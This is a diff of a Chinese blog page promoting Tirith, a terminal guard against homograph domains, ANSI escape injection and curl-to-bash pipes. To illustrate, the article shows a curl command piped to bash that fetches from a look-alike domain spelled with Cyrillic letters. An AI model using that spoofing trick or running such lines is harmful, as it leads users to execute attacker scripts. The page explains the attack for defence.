@@ -1,6 +1,9 @@
 
+
 <!DOCTYPE html>
 <html lang="zh-CN" data-default-color-scheme=auto>
+
+
 
 <head>
   <meta charset="UTF-8">
@@ -11,132 +14,725 @@
   
   <meta name="theme-color" content="#2f4154">
   <meta name="author" content="o_O">
-  <meta name="keywords" content="命令行,Tirith,安全工具">
+  <meta name="keywords" content="hexo,记录,博客">
   
-    <meta name="description" content="作为一名开发者，我们的日常几乎离不开终端。Tirith 是终端里的守护者，彻底根除同形攻击与恶意指令注入。">
+    <meta name="description" content="终端里的“守护者”：Tirith —— 彻底根除同形攻击与恶意指令注入作为一名开发者，我们的日常几乎离不开终端。从 GitHub 复制一段 curl 指令，或者在 Stack Overflow 拷贝一行 docker 配置。你是否曾想过，这些看起来人畜无害的字符背后，可能隐藏着足以摧毁你服务器的“赛博病毒”？ 今天，我想安利一个能救命的开源项目 —— **Tirith**。  😱 致命的“像素级">
 <meta property="og:type" content="article">
 <meta property="og:title" content="终端里的“守护者”：Tirith —— 彻底根除同形攻击与恶意指令注入">
-<meta property="og:url" content="https://boaom.github.io/2026/02/06/终端里的守护者Tirith/index.html">
+<meta property="og:url" content="https://0837.eu.org/2026/02/06/%E7%BB%88%E7%AB%AF%E9%87%8C%E7%9A%84%E5%AE%88%E6%8A%A4%E8%80%85Tirith/index.html">
 <meta property="og:site_name" content="o_O">
+<meta property="og:description" content="终端里的“守护者”：Tirith —— 彻底根除同形攻击与恶意指令注入作为一名开发者，我们的日常几乎离不开终端。从 GitHub 复制一段 curl 指令，或者在 Stack Overflow 拷贝一行 docker 配置。你是否曾想过，这些看起来人畜无害的字符背后，可能隐藏着足以摧毁你服务器的“赛博病毒”？ 今天，我想安利一个能救命的开源项目 —— **Tirith**。  😱 致命的“像素级">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://boaom.github.io/img/fluid.png">
 <meta property="article:published_time" content="2026-02-06T05:30:00.000Z">
+<meta property="article:modified_time" content="2026-02-06T05:38:05.263Z">
 <meta property="article:author" content="o_O">
-<meta property="article:tag" content="Linux">
-<meta property="article:tag" content="安全">
+<meta property="article:tag" content="命令行">
+<meta property="article:tag" content="Tirith">
+<meta property="article:tag" content="安全工具">
 <meta name="twitter:card" content="summary_large_image">
   
-  <title>终端里的“守护者”：Tirith - o_O</title>
+  
+  
+  <title>终端里的“守护者”：Tirith —— 彻底根除同形攻击与恶意指令注入 - o_O</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
   <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
   <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
   <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
-  <link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
-  <link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
-  <link  rel="stylesheet" href="/css/main.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
   <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
-  <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
 
   <script id="fluid-configs">
     var Fluid = window.Fluid || {};
-    var CONFIG = {"hostname":"boaom.github.io","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"0837.eu.org","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
   </script>
   <script  src="/js/utils.js" ></script>
   <script  src="/js/color-schema.js" ></script>
-</head>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
 
 <body>
-  <header>
-    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
-      <div class="container">
-        <a class="navbar-brand" href="/"><strong>o_O</strong></a>
-        <div class="collapse navbar-collapse" id="navbarSupportedContent">
-          <ul class="navbar-nav ml-auto text-center">
-            <li class="nav-item"><a class="nav-link" href="/"><i class="iconfont icon-home-fill"></i> 首页</a></li>
-            <li class="nav-item"><a class="nav-link" href="/archives/"><i class="iconfont icon-archive-fill"></i> 归档</a></li>
-          </ul>
-        </div>
-      </div>
-    </nav>
+  
 
-    <div id="banner" class="banner" style="background: url('/img/fluid.png') no-repeat center center; background-size: cover; height: 70vh;">
-      <div class="full-bg-img">
-        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
-          <div class="banner-text text-center fade-in-up">
-            <div class="h2"><span id="subtitle" data-typed-text="终端里的“守护者”：Tirith"></span></div>
-            <div class="mt-3">
-              <span class="post-meta">
-                <i class="iconfont icon-date-fill"></i>
-                <time datetime="2026-02-06 13:30">2026年2月6日 下午</time>
-              </span>
-            </div>
-          </div>
-        </div>
-      </div>
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>o_O</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
     </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/20221106203038.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="终端里的“守护者”：Tirith —— 彻底根除同形攻击与恶意指令注入"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-02-06 13:30" pubdate>
+          2026年2月6日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.3k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          11 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
   </header>
 
   <main>
-    <div class="container-fluid nopadding-x">
-      <div class="row nomargin-x">
-        <div class="col-lg-8 offset-lg-2 nopadding-x-md">
-          <div class="container nopadding-x-md" id="board-ctn">
-            <div id="board">
-              <article class="post-content mx-auto">
-                <div class="markdown-body">
-                  <h1>终端里的“守护者”：Tirith —— 彻底根除同形攻击与恶意指令注入</h1>
-                  <p class="note note-info">本文最后更新于：2026年2月6日 凌晨</p>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">终端里的“守护者”：Tirith —— 彻底根除同形攻击与恶意指令注入</h1>
+            
+              <p class="note note-info">
+                
                   
-                  <p>作为一名开发者，我们的日常几乎离不开终端。从 GitHub 复制一段 <code>curl</code> 指令，或者在 Stack Overflow 拷贝一行 <code>docker</code> 配置。你是否曾想过，这些看起来人畜无害的字符背后，可能隐藏着足以摧毁你服务器的“赛博病毒”？</p>
-                  <p>今天，我想安利一个能救命的开源项目 —— <strong><a href="https://github.com/sheeki03/tirith">Tirith</a></strong>。</p>
+                    本文最后更新于：2026年2月6日 下午
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="终端里的“守护者”：Tirith-——-彻底根除同形攻击与恶意指令注入"><a href="#终端里的“守护者”：Tirith-——-彻底根除同形攻击与恶意指令注入" class="headerlink" title="终端里的“守护者”：Tirith —— 彻底根除同形攻击与恶意指令注入"></a>终端里的“守护者”：Tirith —— 彻底根除同形攻击与恶意指令注入</h1><p>作为一名开发者，我们的日常几乎离不开终端。从 GitHub 复制一段 <code>curl</code> 指令，或者在 Stack Overflow 拷贝一行 <code>docker</code> 配置。你是否曾想过，这些看起来人畜无害的字符背后，可能隐藏着足以摧毁你服务器的“赛博病毒”？</p>
+<p>今天，我想安利一个能救命的开源项目 —— **<a target="_blank" rel="noopener" href="https://github.com/sheeki03/tirith">Tirith</a>**。</p>
+<hr>
+<h2 id="😱-致命的“像素级”骗局"><a href="#😱-致命的“像素级”骗局" class="headerlink" title="😱 致命的“像素级”骗局"></a>😱 致命的“像素级”骗局</h2><p>请睁大眼睛，看看下面这两行代码有什么不同？</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># Line A (Safe)</span><br>curl -sSL https://install.example-cli.dev | bash <br><br><span class="hljs-comment"># Line B (Compromised)</span><br>curl -sSL https://іnstall.example-clі.dev | bash<br></code></pre></td></tr></table></figure>
 
-                  <h2>😱 致命的“像素级”骗局</h2>
-                  <p>请睁大眼睛，看看下面这两行代码有什么不同？</p>
-                  <pre><code class="hljs bash"># Line A (Safe)
-curl -sSL https://install.example-cli.dev | bash 
+<p><strong>答案是：</strong> 没有任何区别。至少对你的肉眼和默认终端配置来说是这样的。</p>
+<p><strong>但真相是：</strong> Line B 中的字母 <code>і</code> 并不是英语字母，而是 **西里尔字母 (U+0456)**。它会引导你的 <code>curl</code> 请求访问一个完全由攻击者控制的伪造域名。</p>
+<p>如果你按下回车，你执行的不再是安装脚本，而是攻击者的恶意 Payload。浏览器在几年前就解决了这个问题，但<strong>我们的终端（Terminal）至今依然是“不设防”的。</strong></p>
+<hr>
+<h2 id="🛡️-Tirith：终端世界的“米纳斯提里斯”"><a href="#🛡️-Tirith：终端世界的“米纳斯提里斯”" class="headerlink" title="🛡️ Tirith：终端世界的“米纳斯提里斯”"></a>🛡️ Tirith：终端世界的“米纳斯提里斯”</h2><p>Tirith 取名自《指环王》中的刚铎都城，意为“守护者”。它是一个极轻量、零延迟的命令行安全网关，旨在通过自动化扫描拦截这些肉眼不可见的危险。</p>
+<h3 id="🚀-它的核心能力："><a href="#🚀-它的核心能力：" class="headerlink" title="🚀 它的核心能力："></a>🚀 它的核心能力：</h3><ol>
+<li><p><strong>同形攻击防御 (Homograph Defense)</strong><br>自动检测指令中包含的非 ASCII 同形字符，一旦发现恶意混淆，立即在执行前强行拦截。</p>
+</li>
+<li><p><strong>ANSI 转义注入防护</strong><br>防止恶意代码利用 ANSI 转义序列清空终端显示或篡改执行结果。</p>
+</li>
+<li><p><strong>管道指令安全预警</strong><br>针对 <code>curl | bash</code> 或 <code>wget | sh</code> 这种“危险模式”，Tirith 会强制弹出 Warning，要求你二次确认。</p>
+</li>
+<li><p><strong>关键配置文件锁定</strong><br>任何试图修改 <code>~/.ssh/authorized_keys</code>、<code>~/.bashrc</code> 或 <code>~/.gitconfig</code> 的可疑行为，都会被 Tirith 锁定并阻断。</p>
+</li>
+</ol>
+<hr>
+<h2 id="🔥-深度体验：为什么它是装机必备？"><a href="#🔥-深度体验：为什么它是装机必备？" class="headerlink" title="🔥 深度体验：为什么它是装机必备？"></a>🔥 深度体验：为什么它是装机必备？</h2><ul>
+<li><strong>性能近乎原生</strong>：基于 Rust 的极简设计，扫描耗时通常小于 1 毫秒，你完全感受不到性能损耗。</li>
+<li><strong>完全本地化</strong>：零数据外泄！所有分析都在你本地机器上完成，不需要任何 API Key。</li>
+<li><strong>全平台兼容</strong>：完美支持 <code>zsh</code>, <code>bash</code>, <code>fish</code> 以及 Windows 上的 <code>PowerShell</code>。</li>
+</ul>
+<hr>
+<h2 id="🛠️-三秒开启“神装”模式"><a href="#🛠️-三秒开启“神装”模式" class="headerlink" title="🛠️ 三秒开启“神装”模式"></a>🛠️ 三秒开启“神装”模式</h2><p><strong>使用 npm 一键安装：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm install -g tirith &amp;&amp; <span class="hljs-built_in">eval</span> <span class="hljs-string">&quot;<span class="hljs-subst">$(tirith init)</span>&quot;</span><br></code></pre></td></tr></table></figure>
 
-# Line B (Compromised)
-curl -sSL https://іnstall.example-clі.dev | bash</code></pre>
-                  <p><strong>答案是：</strong> 没有任何区别。至少对你的肉眼和默认终端配置来说是这样的。</p>
-                  <p><strong>但真相是：</strong> Line B 中的字母 <code>і</code> 并不是英语字母，而是 <strong>西里尔字母 (U+0456)</strong>。它会引导你的 <code>curl</code> 请求访问一个完全由攻击者控制的伪造域名。</p>
+<p><strong>macOS 玩家专属：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">brew install sheeki03/tap/tirith &amp;&amp; <span class="hljs-built_in">eval</span> <span class="hljs-string">&quot;<span class="hljs-subst">$(tirith init)</span>&quot;</span><br></code></pre></td></tr></table></figure>
 
-                  <h2>🛡️ Tirith：终端世界的“米纳斯提里斯”</h2>
-                  <p>Tirith 取名自《指环王》中的刚铎都城，意为“守护者”。它是一个极轻量、零延迟的命令行安全网关。</p>
-                  <ul>
-                    <li><strong>同形攻击防御</strong>：自动检测指令中包含的非 ASCII 同形字符。</li>
-                    <li><strong>ANSI 转义注入防护</strong>：防止恶意代码篡改终端显示。</li>
-                    <li><strong>管道指令安全预警</strong>：针对 <code>curl | bash</code> 强制弹出 Warning。</li>
-                  </ul>
+<hr>
+<h2 id="💡-结语"><a href="#💡-结语" class="headerlink" title="💡 结语"></a>💡 结语</h2><p>在这个“代码一把梭”的时代，多一份防范就少一分灾难。<strong>Tirith 不是在限制你的自由，它是在你打算“赛博自杀”的时候，帮你拉了一把。</strong></p>
+<p>强烈建议每一位拥有生产服务器或重度依赖终端的同学装上它。</p>
+<hr>
+<blockquote>
+<p>转载请注明出处：<a target="_blank" rel="noopener" href="https://boaom.github.io/">boaom.github.io</a></p>
+</blockquote>
 
-                  <h2>🛠️ 安装方式</h2>
-                  <pre><code class="hljs bash">npm install -g tirith && eval "$(tirith init)"</code></pre>
-                </div>
-              </article>
-            </div>
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Linux/" class="category-chain-item">Linux</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/Linux/%E5%AE%89%E5%85%A8/" class="category-chain-item">安全</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E5%91%BD%E4%BB%A4%E8%A1%8C/">#命令行</a>
+      
+        <a href="/tags/Tirith/">#Tirith</a>
+      
+        <a href="/tags/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/">#安全工具</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>终端里的“守护者”：Tirith —— 彻底根除同形攻击与恶意指令注入</div>
+      <div>https://0837.eu.org/2026/02/06/终端里的守护者Tirith/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>o_O</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年2月6日</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>更新于</div>
+          <div>2026年2月6日</div>
+        </div>
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
           </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/11/06/%E4%BD%BF%E7%94%A8GOST%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/" title="使用GOST搭建一个简单的端口转发">
+                        <span class="hidden-mobile">使用GOST搭建一个简单的端口转发</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="twikoo"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#comments', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/twikoo/1.6.7/twikoo.all.min.js', function() {
+        var options = Object.assign(
+          {"envId":"https://twikoo.0837.eu.org","region":"ap-shanghai","path":"window.location.pathname"},
+          {
+            el: '#twikoo',
+            path: 'window.location.pathname',
+            onCommentLoaded: function() {
+              var imgSelector = '#twikoo .tk-content img:not(.tk-owo-emotion)';
+              Fluid.plugins.imageCaption(imgSelector);
+              Fluid.plugins.fancyBox(imgSelector);
+            }
+          }
+        )
+        twikoo.init(options)
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
         </div>
       </div>
     </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
   </main>
 
-  <footer class="text-center mt-5">
+  <footer>
+    <div class="footer-inner">
+  
     <div class="footer-content">
-      <a href="https://hexo.io" target="_blank"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank"><span>Fluid</span></a>
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
     </div>
+  
+  
+  
+  
+</div>
+
   </footer>
 
-  <script src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js"></script>
-  <script src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js"></script>
-  <script src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js"></script>
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
   <script>
     (function (window, document) {
       var typing = Fluid.plugins.typing;
       var subtitle = document.getElementById('subtitle');
-      if (!subtitle || !typing) return;
-      typing(subtitle.getAttribute('data-typed-text'));
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
     })(window, document);
   </script>
-  <script src="/js/boot.js"></script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
 </body>
 </html>
